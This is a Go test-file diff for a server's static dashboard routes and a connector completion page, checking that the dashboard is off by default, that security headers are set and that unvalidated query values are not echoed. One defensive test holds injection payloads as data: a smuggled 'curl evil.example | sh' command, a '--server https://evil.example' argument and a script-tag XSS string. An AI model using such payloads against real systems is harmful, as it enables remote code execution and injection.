@@ -33,7 +33,7 @@ func TestSetupStaticFiles_IndexHTML(t *testing.T) {
 	_ = corev1.AddToScheme(scheme)
 	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()
 
-	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080})
+	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})
 
 	req := httptest.NewRequest(http.MethodGet, "/", nil)
 	resp, err := server.app.Test(req)
@@ -57,7 +57,7 @@ func TestSetupStaticFiles_SPARoutes(t *testing.T) {
 	_ = corev1.AddToScheme(scheme)
 	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()
 
-	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080})
+	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})
 
 	spaRoutes := []string{
 		"/login",
@@ -95,7 +95,7 @@ func TestSetupStaticFiles_Favicon(t *testing.T) {
 	_ = corev1.AddToScheme(scheme)
 	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()
 
-	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080})
+	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})
 
 	req := httptest.NewRequest(http.MethodGet, "/favicon.svg", nil)
 	resp, err := server.app.Test(req)
@@ -115,7 +115,7 @@ func TestSetupStaticFiles_Assets(t *testing.T) {
 	_ = corev1.AddToScheme(scheme)
 	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()
 
-	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080})
+	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})
 
 	tests := []struct {
 		name        string
@@ -150,7 +150,7 @@ func TestSetupStaticFiles_DoesNotInterfereWithAPI(t *testing.T) {
 	_ = corev1.AddToScheme(scheme)
 	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()
 
-	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080})
+	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})
 
 	// Health endpoints should still work
 	req := httptest.NewRequest(http.MethodGet, "/healthz", nil)
@@ -179,7 +179,7 @@ func TestSetupStaticFiles_IndexContent(t *testing.T) {
 	_ = corev1.AddToScheme(scheme)
 	fakeClient := fake.NewClientBuilder().WithScheme(scheme).Build()
 
-	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080})
+	server := NewServer(fakeClient, nil, ServerConfig{Port: 8080, DashboardEnabled: true})
 
 	req := httptest.NewRequest(http.MethodGet, "/", nil)
 	resp, err := server.app.Test(req)
@@ -449,7 +449,7 @@ func TestSetupStaticFiles_EmbeddedFallbackHeaders(t *testing.T) {
 	scheme := runtime.NewScheme()
 	_ = corev1alpha1.AddToScheme(scheme)
 	_ = corev1.AddToScheme(scheme)
-	server := NewServer(fake.NewClientBuilder().WithScheme(scheme).Build(), nil, ServerConfig{Port: 8080})
+	server := NewServer(fake.NewClientBuilder().WithScheme(scheme).Build(), nil, ServerConfig{Port: 8080, DashboardEnabled: true})
 
 	// An unknown path has no registered route and is served by the error
 	// handler's SPA fallback; it carries the same document headers as a
@@ -479,5 +479,125 @@ func TestSetupStaticFiles_EmbeddedFallbackHeaders(t *testing.T) {
 	}
 	if resp.StatusCode != http.StatusNotFound {
 		t.Fatalf("missing asset StatusCode = %d, want 404", resp.StatusCode)
+	}
+}
+
+// newConfiguredTestServer builds the production server from config, so the
+// dashboard flag decides which static routes exist.
+func newConfiguredTestServer(t *testing.T, config ServerConfig) *Server {
+	t.Helper()
+	scheme := runtime.NewScheme()
+	_ = corev1alpha1.AddToScheme(scheme)
+	_ = corev1.AddToScheme(scheme)
+	config.Port = 8080
+	return NewServer(fake.NewClientBuilder().WithScheme(scheme).Build(), nil, config)
+}
+
+func TestSetupStaticFiles_DashboardDisabledByDefault(t *testing.T) {
+	server := newConfiguredTestServer(t, ServerConfig{})
+
+	// Without the dashboard, its routes and the SPA fallback are gone: every
+	// unrouted path is a JSON 404, the same answer the API paths give.
+	for _, path := range []string{"/", "/login", "/tasks", "/settings/connectors", "/some-ui-route", "/assets/main.js", "/favicon.svg"} {
+		t.Run(path, func(t *testing.T) {
+			resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, path, nil))
+			if err != nil {
+				t.Fatalf("Test request failed: %v", err)
+			}
+			if resp.StatusCode != http.StatusNotFound {
+				t.Fatalf("StatusCode = %d, want %d", resp.StatusCode, http.StatusNotFound)
+			}
+			if ct := resp.Header.Get("Content-Type"); !strings.Contains(ct, "application/json") {
+				t.Fatalf("Content-Type = %s, want application/json", ct)
+			}
+		})
+	}
+
+	resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, "/healthz", nil))
+	if err != nil {
+		t.Fatalf("Test request failed: %v", err)
+	}
+	if resp.StatusCode != http.StatusOK {
+		t.Fatalf("healthz StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
+	}
+}
+
+func getConnectorCompletionPage(t *testing.T, server *Server, target string) (*http.Response, string) {
+	t.Helper()
+	resp, err := server.app.Test(httptest.NewRequest(http.MethodGet, target, nil))
+	if err != nil {
+		t.Fatalf("Test request failed: %v", err)
+	}
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		t.Fatalf("Failed to read body: %v", err)
+	}
+	return resp, string(body)
+}
+
+func TestConnectorCompletionPage_WithoutDashboard(t *testing.T) {
+	server := newConfiguredTestServer(t, ServerConfig{Connectors: ConnectorConfig{Enabled: true}})
+
+	resp, body := getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=pending&connection=github-abc123&namespace=team-a")
+	if resp.StatusCode != http.StatusOK {
+		t.Fatalf("StatusCode = %d, want %d", resp.StatusCode, http.StatusOK)
+	}
+	for header, want := range map[string]string{
+		"Content-Type":            "text/html; charset=utf-8",
+		"Cache-Control":           "no-store",
+		"Referrer-Policy":         "no-referrer",
+		"Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
+		"X-Content-Type-Options":  "nosniff",
+	} {
+		if got := resp.Header.Get(header); got != want {
+			t.Errorf("%s = %q, want %q", header, got, want)
+		}
+	}
+	if want := "orka connection complete github-abc123 --namespace team-a --completion &lt;value&gt;"; !strings.Contains(body, want) {
+		t.Fatalf("body does not show %q:\n%s", want, body)
+	}
+	if strings.Contains(body, "<script") {
+		t.Fatalf("completion page must not run script:\n%s", body)
+	}
+
+	_, body = getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=error&reason=scopes_denied&connection=github-abc123")
+	if !strings.Contains(body, "Linking failed (scopes_denied).") || strings.Contains(body, "orka connection complete") {
+		t.Fatalf("error page should name the reason and offer no completion command:\n%s", body)
+	}
+}
+
+func TestConnectorCompletionPage_ShowsOnlyValidatedQueryValues(t *testing.T) {
+	server := newConfiguredTestServer(t, ServerConfig{Connectors: ConnectorConfig{Enabled: true}})
+
+	// Anyone can send a person this URL, so a query value that is not a
+	// Kubernetes name or a reason code must not become part of the command
+	// the page tells them to run.
+	_, body := getConnectorCompletionPage(t, server, connectorSettingsPath+
+		"?status=pending&connection=x%3B%20curl%20evil.example%20%7C%20sh&namespace=a%20--server%20https://evil.example")
+	if strings.Contains(body, "evil.example") {
+		t.Fatalf("page echoed an unvalidated query value:\n%s", body)
+	}
+	if !strings.Contains(body, "orka connection complete &lt;name&gt; --completion &lt;value&gt;") || !strings.Contains(body, "orka connection list") {
+		t.Fatalf("page should fall back to a placeholder name:\n%s", body)
+	}
+
+	for _, reason := range []string{"%3Cscript%3Ealert(1)%3C/script%3E", "disable_authentication_and_retry"} {
+		_, body = getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=error&reason="+reason)
+		if strings.Contains(body, "alert(1)") || strings.Contains(body, "disable_authentication") || !strings.Contains(body, "Linking failed.") {
+			t.Fatalf("page echoed an unknown reason %q:\n%s", reason, body)
+		}
+	}
+}
+
+func TestConnectorCompletionPage_DashboardOwnsThePath(t *testing.T) {
+	server := newConfiguredTestServer(t, ServerConfig{DashboardEnabled: true, Connectors: ConnectorConfig{Enabled: true}})
+
+	index, ok := embeddedSPAIndexPage()
+	if !ok {
+		t.Fatal("embedded index.html is unavailable")
+	}
+	_, body := getConnectorCompletionPage(t, server, connectorSettingsPath+"?status=pending&connection=github-abc123")
+	if body != string(index.html) {
+		t.Fatalf("with the dashboard enabled, its page finishes the link instead:\n%s", body)
 	}
 }
